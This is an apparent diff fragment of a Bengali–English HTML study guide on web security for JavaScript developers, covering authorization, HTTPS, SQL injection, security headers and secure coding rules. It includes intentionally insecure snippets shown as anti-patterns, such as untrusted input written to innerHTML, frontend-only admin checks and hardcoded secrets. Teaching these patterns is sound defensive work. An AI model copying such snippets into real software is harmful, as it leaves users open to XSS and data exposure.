+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">HTTP RESPONSE HEADERS</span><span>HTTP</span></div>
+  <pre><code><span style="color: #38bdf8; font-weight: bold;">Content-Security-Policy:</span>
+frame-ancestors &#x27;self&#x27;</code></pre>
+</div>
+      <p class="text-p">এবং পুরনো/compatibility context-এ:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">HTTP RESPONSE HEADERS</span><span>HTTP</span></div>
+  <pre><code>X-Frame-Options</code></pre>
+</div>
+      <p class="text-p">ব্যবহার করা হতে পারে।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.45</span> HTTPS</div>
+      <p class="text-p">HTTP:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">http://</pre>
+</div>
+      <p class="text-p">HTTPS:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">https://</pre>
+</div>
+      <p class="text-p">HTTPS TLS ব্যবহার করে communication secure করে। এটি:</p>
+      <ul style="margin: 2px 0 5px 16px; color: #334155; font-size: 10.5px;">
+        <li>Confidentiality</li>
+        <li>Integrity</li>
+        <li>Server authentication</li>
+      </ul>
+      <p class="text-p">এর জন্য গুরুত্বপূর্ণ।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.46</span> HTTPS কী Prevent করে না?</div>
+      <p class="text-p">HTTPS থাকলেই application secure হয়ে যায় না। HTTPS:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Transport security</pre>
+</div>
+      <p class="text-p">দেয়। কিন্তু:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ XSS INJECTION & EXECUTION PIPELINE</div>
+  <pre class="ascii-tree-content"><span style="color: #f43f5e; font-weight: 700;"><span style="color: #f43f5e; font-weight: bold;">X</span>SS</span>
+<span style="color: #f43f5e; font-weight: 700;">SQL Injection</span>
+Broken <span style="color: #c084fc; font-weight: 700;">Authorization</span>
+Bad <span style="color: #c084fc; font-weight: 700;">Authentication</span>
+<span style="color: #f43f5e; font-weight: 700;">CSRF</span></pre>
+</div>
+      <p class="text-p">এসব automatically solve করে না।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.47</span> SQL Injection — JavaScript Developer-এর জানা দরকার</div>
+      <p class="text-p">Backend যদি user input সরাসরি SQL query-তে concatenate করে:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">SQL query
++
+<span style="color: #f43f5e; font-weight: 700;">Untrusted</span> input</pre>
+</div>
+      <p class="text-p">তাহলে injection vulnerability হতে পারে। Better:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Parameterized Query
+Prepared Statement
+ORM নিরাপদভাবে ব্যবহার</pre>
+</div>
+      <p class="text-p">Frontend JavaScript validation SQL injection prevention-এর substitute নয়।</p>
+    </div>
+    <div class="part-banner">Part 09 — API Security, Authentication vs Authorization & Info Leakage (31.48 – 31.53)</div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.48</span> API Security</div>
+      <p class="text-p">Frontend:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">JAVASCRIPT Source</span><span>JAVASCRIPT</span></div>
+  <pre><code><span class="syn-fn">fetch</span>(&quot;/api/users&quot;);</code></pre>
+</div>
+      <p class="text-p">API secure করতে:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SAME-ORIGIN POLICY & CORS ACCESS CONTROL</div>
+  <pre class="ascii-tree-content"><span style="color: #c084fc; font-weight: 700;">Authentication</span>
+<span style="color: #c084fc; font-weight: 700;">Authorization</span>
+Input validation
+Rate limiting
+<span style="color: #34d399; font-weight: 700;">HTTPS</span>
+<span style="color: #fde047; font-weight: 600;">CORS</span> policy
+Error handling
+Logging</pre>
+</div>
+      <p class="text-p">দরকার হতে পারে।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.49</span> Authentication কখনো Frontend-only নয়</div>
+      <p class="text-p">Dangerous assumption:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">JAVASCRIPT Source</span><span>JAVASCRIPT</span></div>
+  <pre><code><span class="syn-kw">if</span> (isAdmin) {
+    showDeleteButton();
+}</code></pre>
+</div>
+      <p class="text-p">UI hide/show করা authorization নয়। Attacker manually API call করতে পারে। Backend-এ:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">DELETE /api/users/123
+        <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #c084fc; font-weight: 700;">Authentication</span>
+        <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #c084fc; font-weight: 700;">Authorization</span>
+        <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #34d399; font-weight: 700;">Allowed</span>?
+        <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Delete</pre>
+</div>
+      <p class="text-p">check করতে হবে।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.50</span> UI Security vs Real Security</div>
+      <p class="text-p">Frontend:</p>
+      <div class="code-box code-box-error">
+  <div class="code-top"><span style="color: #f87171; font-weight: 600;">JAVASCRIPT Source</span><span>❌ Vulnerable / Attack Vector</span></div>
+  <pre><code><span class="syn-kw">if</span> (user.role === <span class="syn-str">&quot;admin&quot;</span>) {
+    showAdminPanel();
+}</code></pre>
+</div>
+      <p class="text-p">এটা UX control। কিন্তু backend-এও:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Is authenticated?
++
+Is authorized?</pre>
+</div>
+      <p class="text-p">verify করতে হবে।</p>
+      <div class="section-subhead">🔹 🔥 Golden Rule</div>
+      <div class="warn-box">⚠️ <strong>Never trust the frontend for authorization.</strong></div>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.51</span> Error Messages</div>
+      <p class="text-p">Bad:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content"><span style="color: #c084fc; font-weight: 700;">Login</span> failed because password for admin@example.com is wrong.</pre>
+</div>
+      <p class="text-p">এতে information leak হতে পারে। Better generic response:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Invalid email or password.</pre>
+</div>
+      <p class="text-p">Backend logs-এ বিস্তারিত technical information রাখা যেতে পারে।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.52</span> Sensitive Information Leak</div>
+      <p class="text-p">Production-এ এমন error response avoid করো:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">JAVASCRIPT Source</span><span>JAVASCRIPT</span></div>
+  <pre><code>res.json({
+    databasePassword: password,
+    stackTrace: error.stack
+});</code></pre>
+</div>
+      <p class="text-p">User-facing response:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Something went wrong.</pre>
+</div>
+      <p class="text-p">Server-side logs:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Detailed technical information</pre>
+</div>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.53</span> API Rate Limiting</div>
+      <p class="text-p">একজন client যদি continuously:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">1000 requests/sec</pre>
+</div>
+      <p class="text-p">পাঠায়, API overload হতে পারে। Rate limiting:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content"><span style="color: #fde047; font-weight: 600;">Client</span>
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Request count
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Limit exceeded?
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+429 Too Many Requests</pre>
+</div>
+      <p class="text-p">ধরনের mechanism ব্যবহার করতে পারে।</p>
+    </div>
+    <div class="part-banner">Part 10 — Password Hashing, Secrets Management & HTTP Security Headers (31.54 – 31.60)</div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.54</span> Password Security</div>
+      <p class="text-p">Password কখনো plaintext হিসেবে database-এ রাখবে না। Bad:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">password = &quot;mypassword123&quot;</pre>
+</div>
+      <p class="text-p">Database-এ সরাসরি রাখা। Better:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Password
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Strong Password Hashing
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #fde047; font-weight: 600;">Database</span></pre>
+</div>
+      <p class="text-p">Modern password hashing algorithms যেমন:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Argon2
+<span style="color: #fb923c; font-weight: 700;">bcrypt</span>
+scrypt</pre>
+</div>
+      <p class="text-p">use case অনুযায়ী ব্যবহার করা হয়।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.55</span> Password Hash ≠ Encryption</div>
+      <p class="text-p">Hashing:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Password
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Hash</pre>
+</div>
+      <p class="text-p">Encryption:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Data
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #34d399; font-weight: 700;">Encrypted</span> Data
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Key দিয়ে decrypt</pre>
+</div>
+      <p class="text-p">Password storage-এর ক্ষেত্রে সাধারণত password hashing ব্যবহার করা হয়, reversible encryption নয়।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.56</span> Secrets কখনো Frontend Code-এ রাখবে না</div>
+      <p class="text-p">Bad:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">JAVASCRIPT Source</span><span>JAVASCRIPT</span></div>
+  <pre><code><span class="syn-kw">const</span> API_SECRET = <span class="syn-str">&quot;super-secret-key&quot;</span>;</code></pre>
+</div>
+      <p class="text-p">Frontend application-এ থাকা secret সত্যিকার অর্থে secret নয়। কারণ browser user-এর কাছে code/data পাঠানো হয়।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.57</span> <code>.env</code> কি সব Secret বাঁচায়?</div>
+      <p class="text-p">Frontend build tools-এ environment variables থাকলেও সব variable secret নয়। উদাহরণ:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">VITE_API_URL</pre>
+</div>
+      <p class="text-p">frontend-এ expose করলে সেটা secret নয়। যে value browser-এ bundle হয়ে যায়:</p>
+      <div class="warn-box">⚠️ User সেটা eventually দেখতে পারে।</div>
+      <div class="section-subhead">🔹 🔥 Rule:</div>
+      <div class="warn-box">⚠️ <strong>If the browser needs it, assume the user can inspect it.</strong></div>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.58</span> Security Headers</div>
+      <p class="text-p">Common security-related headers:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Content-Security-Policy
+<span style="color: #34d399; font-weight: 700;">Strict</span>-Transport-Security
+<span style="color: #f43f5e; font-weight: bold;">X</span>-Content-Type-Options
+Referrer-Policy
+Permissions-Policy</pre>
+</div>
+      <p class="text-p">এছাড়া framing protection-এর জন্য:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content"><span style="color: #f43f5e; font-weight: bold;">X</span>-Frame-Options</pre>
+</div>
+      <p class="text-p">ব্যবহার করা হতে পারে। Configuration application অনুযায়ী করতে হয়।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.59</span> HSTS</div>
+      <p class="text-p"><strong>HTTP Strict Transport Security</strong> Header:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">HTTP RESPONSE HEADERS</span><span>HTTP</span></div>
+  <pre><code><span style="color: #38bdf8; font-weight: bold;">Strict-Transport-Security:</span> <span style="color: #4ade80; font-weight: bold;">max-age</span>=31536000</code></pre>
+</div>
+      <p class="text-p">Browser-কে future requests-এর ক্ষেত্রে HTTPS ব্যবহার করতে নির্দেশ দিতে সাহায্য করে। Production deployment-এ carefully configure করতে হয়।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.60</span> <code>X-Content-Type-Options</code></div>
+      <p class="text-p">Common value:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">HTTP RESPONSE HEADERS</span><span>HTTP</span></div>
+  <pre><code><span style="color: #38bdf8; font-weight: bold;">X-Content-Type-Options:</span> <span style="color: #4ade80; font-weight: bold;">nosniff</span></code></pre>
+</div>
+      <p class="text-p">Browser-এর MIME type sniffing behavior সীমিত করতে সাহায্য করে।</p>
+    </div>
+    <div class="part-banner">Part 11 — Layered Defense, Supply Chain Audits & Secure Coding Mindset (31.61 – 31.70)</div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.61</span> Security হলো Layered Defense</div>
+      <p class="text-p">একটি secure application সাধারণত:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SAME-ORIGIN POLICY & CORS ACCESS CONTROL</div>
+  <pre class="ascii-tree-content"><span style="color: #34d399; font-weight: 700;">HTTPS</span>
+  +
+<span style="color: #c084fc; font-weight: 700;">Authentication</span>
+  +
+<span style="color: #c084fc; font-weight: 700;">Authorization</span>
+  +
+<span style="color: #c084fc; font-weight: 700;">Validation</span>
+  +
+<span style="color: #34d399; font-weight: 700;">Safe</span> Output
+  +
+<span style="color: #34d399; font-weight: 700;">CSP</span>
+  +
+<span style="color: #34d399; font-weight: 700;">Secure</span> Cookies
+  +
+<span style="color: #fde047; font-weight: 600;">CORS</span>
+  +
+<span style="color: #c084fc; font-weight: 700;">Rate Limiting</span>
+  +
+<span style="color: #34d399; font-weight: 700;">Secure</span> Dependencies
+  +
+Logging</pre>
+</div>
+      <p class="text-p">ব্যবহার করে। এটাকে বলা যায়:</p>
+      <div class="warn-box">⚠️ <strong>Defense in Depth</strong></div>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.62</span> Dependency Security</div>
+      <p class="text-p">তুমি যদি:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">CLI COMMAND</span><span>BASH</span></div>
+  <pre><code>npm install package-name</code></pre>
+</div>
+      <p class="text-p">করো, third-party dependency তোমার application-এর security-এর অংশ হয়ে যায়। তাই:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">CLI COMMAND</span><span>BASH</span></div>
+  <pre><code>npm audit</code></pre>
+</div>
+      <p class="text-p">দিয়ে known vulnerabilities check করা যায়। এছাড়া:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">CLI COMMAND</span><span>BASH</span></div>
+  <pre><code>npm outdated</code></pre>
+</div>
+      <p class="text-p">দিয়ে outdated packages দেখা যায়। তবে audit-এর output blindly apply না করে dependency update-এর impact যাচাই করতে হবে।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.63</span> Supply Chain Security</div>
+      <p class="text-p">তোমার application:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Your Code
+    +
+npm Packages
+    +
+Build Tools
+    +
+CI/CD</pre>
+</div>
+      <p class="text-p">সব মিলেই software supply chain। তাই:</p>
+      <ul style="margin: 2px 0 5px 16px; color: #334155; font-size: 10.5px;">
+        <li>Trusted dependencies</li>
+        <li>Lockfiles</li>
+        <li>Updates</li>
+        <li>Dependency review</li>
+        <li>Minimal dependencies</li>
+      </ul>
+      <p class="text-p">গুরুত্বপূর্ণ।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.64</span> Secure Coding Example</div>
+      <div class="section-subhead">🔹 ❌ Risky</div>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">JAVASCRIPT Source</span><span>JAVASCRIPT</span></div>
+  <pre><code><span class="syn-kw">const</span> input = <span class="syn-fn">location</span>.search;
+
+<span class="syn-fn">document</span>.<span style="color: #38bdf8; font-weight: 600;">querySelector</span>(&quot;#output&quot;).<span style="color: #f87171; font-weight: bold; text-decoration: underline wavy #ef4444 1.5px;">innerHTML</span> = input;</code></pre>
+</div>
+      <div class="section-subhead">🔹 ✅ Safer</div>
+      <div class="code-box code-box-correct">
+  <div class="code-top"><span style="color: #4ade80; font-weight: 600;">JAVASCRIPT Source</span><span>✅ Secure / Mitigated Pattern</span></div>
+  <pre><code><span class="syn-kw">const</span> input = <span class="syn-fn">location</span>.search;
+
+<span class="syn-fn">document</span>.<span style="color: #38bdf8; font-weight: 600;">querySelector</span>(&quot;#output&quot;).textContent = input;</code></pre>
+</div>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.65</span> Secure API Example</div>
+      <p class="text-p">Frontend:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">JAVASCRIPT Source</span><span>JAVASCRIPT</span></div>
+  <pre><code><span class="syn-kw">async</span> <span class="syn-kw">function</span> getProfile() {
+    <span class="syn-kw">const</span> response = <span class="syn-kw">await</span> <span class="syn-fn">fetch</span>(&quot;/api/profile<span class="syn-str">&quot;, {
+        credentials: &quot;</span>include<span class="syn-str">&quot;
+    });
+
+    if (!response.ok) {
+        throw new Error(&quot;</span>Request failed&quot;);
+    }
+
+    <span class="syn-kw">return</span> response.json();
+}</code></pre>
+</div>
+      <p class="text-p">Backend-এর responsibility:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Authenticate
+     <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Authorize
+     <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Validate
+     <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Process
+     <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Return safe response</pre>
+</div>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.66</span> CORS ≠ Authentication</div>
+      <p class="text-p">এটা খুব গুরুত্বপূর্ণ। CORS বলে:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Which browser origins can access this response?</pre>
+</div>
+      <p class="text-p">Authentication বলে:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Who is the user?</pre>
+</div>
+      <p class="text-p">Authorization বলে:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">What can this user do?</pre>
+</div>
+      <p class="text-p">তিনটি আলাদা বিষয়।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.67</span> CSP ≠ XSS Prevention-এর Complete Replacement</div>
+      <p class="text-p">CSP XSS risk reduce করতে সাহায্য করে। কিন্তু:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content"><span style="color: #34d399; font-weight: 700;">CSP</span>
+≠
+Complete Security</pre>
+</div>
+      <p class="text-p">Safe coding, output encoding, proper sanitization, framework protections—সব দরকার।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.68</span> Validation ≠ Security-এর Complete Solution</div>
+      <p class="text-p">এই:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">JAVASCRIPT Source</span><span>JAVASCRIPT</span></div>
+  <pre><code><span class="syn-kw">if</span> (username.length &gt; <span class="syn-num">3</span>) {
+    <span class="syn-com">// okay</span>
+}</code></pre>
+</div>
+      <p class="text-p">শুধু business/input validation। Security-এর জন্য context অনুযায়ী:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content"><span style="color: #c084fc; font-weight: 700;">Validation</span>
++
+Encoding
++
+<span style="color: #c084fc; font-weight: 700;">Sanitization</span>
++
+<span style="color: #c084fc; font-weight: 700;">Authorization</span>
++
+<span style="color: #fde047; font-weight: 600;">Server</span>-side checks</pre>
+</div>
+      <p class="text-p">প্রয়োজন হতে পারে।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.69</span> Secure Development Mindset</div>
+      <p class="text-p">Code লেখার সময় নিজেকে প্রশ্ন করো:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ XSS INJECTION & EXECUTION PIPELINE</div>
+  <pre class="ascii-tree-content">1. এই input কোথা থেকে এসেছে?
+2. <span style="color: #fde047; font-weight: 600;">User</span> কি এটা control করতে পারে?
+3. আমি কি এটা HTML হিসেবে render করছি?
+4. <span style="color: #fde047; font-weight: 600;">Backend</span> কি আবার validate করছে?
+5. <span style="color: #fde047; font-weight: 600;">User</span> এই action-এর জন্য authorized?
+6. Sensitive data কোথায় রাখা হচ্ছে?
+7. Token JavaScript access করতে পারছে?
+8. <span style="color: #fde047; font-weight: 600;">API</span> কি <span style="color: #34d399; font-weight: 700;">HTTPS</span>-এ চলছে?
+9. Error response sensitive data leak করছে?
+10. Dependency নিরাপদ ও updated?</pre>
+</div>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.70</span> 🔥 MUST KNOW — ওয়েব সিকিউরিটির প্রধান স্তম্ভসমূহ</div>
+      <p class="text-p">চ্যাপ্টার ৩১ থেকে প্রতিটি সফটওয়্যার ইঞ্জিনিয়ারের যেসব বিষয় সরাসরি মস্তিষ্কে গেঁথে থাকা বাধ্যতামূলক:</p>
+      <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 4px;">
+        <div style="background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 5px; padding: 6px 8px;">
+          <div style="font-weight: 700; color: #dc2626; font-size: 10px; margin-bottom: 3px;">📌 1. XSS &amp; DOM Security</div>
+          <ul style="margin-left: 14px; font-size: 9px; color: #334155; line-height: 1.4;">
+            <li>Stored, Reflected, DOM-based XSS</li>
+            <li>Dangerous Sinks: <code>innerHTML</code>, <code>eval()</code></li>
+            <li>Safe Sinks: <code>textContent</code>, DOMPurify</li>
+            <li>Content Security Policy (CSP)</li>
+          </ul>
+        </div>
+        <div style="background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 5px; padding: 6px 8px;">
+          <div style="font-weight: 700; color: #d97706; font-size: 10px; margin-bottom: 3px;">📌 2. Request &amp; Origin Security</div>
+          <ul style="margin-left: 14px; font-size: 9px; color: #334155; line-height: 1.4;">
+            <li>CSRF &amp; SameSite Cookies</li>
+            <li>Same-Origin Policy (SOP: Scheme+Host+Port)</li>
+            <li>CORS Preflight &amp; Access-Control Headers</li>
+            <li>CORS is NOT Authentication</li>
+          </ul>
+        </div>
+        <div style="background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 5px; padding: 6px 8px;">
+          <div style="font-weight: 700; color: #059669; font-size: 10px; margin-bottom: 3px;">📌 3. Identity &amp; Transport Defense</div>
+          <ul style="margin-left: 14px; font-size: 9px; color: #334155; line-height: 1.4;">
+            <li>HttpOnly + Secure + SameSite Cookies</li>
+            <li>JWT Header.Payload.Signature &amp; Verification</li>
+            <li>HTTPS, TLS &amp; HSTS Strict Headers</li>
+            <li>Secrets Management &amp; Server-side AuthZ</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <div class="part-banner">Part 12 — Quick Cheat Sheet, 10 Golden Security Rules & Hands-On Practice Lab</div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.Cheat</span> 🧠 Quick Cheat Sheet — Web Security Terminology</div>
+      <p class="text-p">ওয়েব সিকিউরিটির সর্বাধিক ব্যবহৃত টার্মগুলোর তাৎক্ষণিক অর্থ ও ভূমিকা:</p>
+      <div class="table-container">
+  <table class="master-table">
+    <thead>
+      <tr><th>Concept</th><th>মনে রাখবে</th></tr>
+    </thead>
+    <tbody>
+      <tr><td>XSS</td><td>Untrusted script/content execution</td></tr><tr><td>CSRF</td><td>Authenticated user দিয়ে unwanted action করানোর চেষ্টা</td></tr><tr><td>CORS</td><td>Cross-origin browser access control</td></tr><tr><td>SOP</td><td>Same-origin browser security policy</td></tr><tr><td>CSP</td><td>Allowed resource/script policy</td></tr><tr><td>Authentication</td><td>তুমি কে?</td></tr><tr><td>Authorization</td><td>তুমি কী করতে পারো?</td></tr><tr><td>HttpOnly</td><td>JS থেকে cookie access বন্ধ করে</td></tr><tr><td>Secure</td><td>HTTPS-এ cookie পাঠানোর জন্য</td></tr><tr><td>SameSite</td><td>Cross-site cookie behavior control</td></tr><tr><td>JWT</td><td>Token format</td></tr><tr><td><code>eval()</code></td><td>Dynamic code execution; avoid</td></tr><tr><td>Prototype Pollution</td><td>Prototype chain-এর unsafe modification</td></tr><tr><td>HTTPS</td><td>Transport security</td></tr><tr><td>Validation</td><td>Input acceptable কি না</td></tr><tr><td>Sanitization</td><td>Unsafe content clean/transform করা</td></tr><tr><td>Rate Limiting</td><td>Request abuse সীমিত করা</td></tr>
+    </tbody>
+  </table>
+</div>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.Rules</span> 🔥 সবচেয়ে গুরুত্বপূর্ণ ১০টি Security Rules</div>
+      <p class="text-p">প্রোডাকশন গ্রেড ওয়েব অ্যাপ্লিকেশন তৈরির সময় প্রতিটি ইঞ্জিনিয়ারের এই ১০টি মূলনীতি মেনে চলা আবশ্যক:</p>
+      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 6px; margin-top: 5px;">
+        <div style="background: #f8fafc; border-left: 3px solid #ef4444; padding: 5px 8px; border-radius: 0 4px 4px 0; font-size: 9.5px;">
+          <strong>Rule 1:</strong> Never trust user input (Always validate &amp; sanitize).
+        </div>
+        <div style="background: #f8fafc; border-left: 3px solid #f97316; padding: 5px 8px; border-radius: 0 4px 4px 0; font-size: 9.5px;">
+          <strong>Rule 2:</strong> Never trust the frontend for authorization (Server-side check is mandatory).
+        </div>
+        <div style="background: #f8fafc; border-left: 3px solid #eab308; padding: 5px 8px; border-radius: 0 4px 4px 0; font-size: 9.5px;">
+          <strong>Rule 3:</strong> Never put real secrets or private keys in frontend client code.
+        </div>
+        <div style="background: #f8fafc; border-left: 3px solid #84cc16; padding: 5px 8px; border-radius: 0 4px 4px 0; font-size: 9.5px;">
+          <strong>Rule 4:</strong> Avoid <code>eval()</code> and <code>new Function()</code> with untrusted input.
+        </div>
+        <div style="background: #f8fafc; border-left: 3px solid #10b981; padding: 5px 8px; border-radius: 0 4px 4px 0; font-size: 9.5px;">
+          <strong>Rule 5:</strong> Prefer <code>textContent</code> over <code>innerHTML</code> for plain text rendering.
+        </div>
